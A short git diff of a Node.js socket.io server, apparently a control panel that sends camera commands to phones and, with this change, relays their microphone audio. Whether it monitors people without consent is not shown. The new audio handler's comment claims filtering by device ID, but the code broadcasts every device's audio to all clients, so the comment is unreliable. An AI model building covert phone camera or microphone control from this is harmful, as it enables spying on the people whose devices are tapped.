@@ -28,9 +28,9 @@ io.on('connection', (socket) => {
 
     socket.on('send_command_to_device', (data) => {
         console.log(`[>] Enviando comando (${data.action}) al celular: ${data.targetId}`);
-        io.to(data.targetId).emit('command_to_phone', { 
-            action: data.action, 
-            lens: data.lens || 'back' 
+        io.to(data.targetId).emit('command_to_phone', {
+            action: data.action,
+            lens: data.lens || 'back'
         });
     });
 
@@ -58,6 +58,11 @@ io.on('connection', (socket) => {
         } else {
             console.log(`[-] Panel web desconectado: ${socket.id}`);
         }
+    });
+
+    // Transmisión de audio filtrada por ID de dispositivo
+    socket.on('audio_chunk', (base64Audio) => {
+        io.emit('audio_chunk', { deviceId: socket.id, chunk: base64Audio });
     });
 });
 
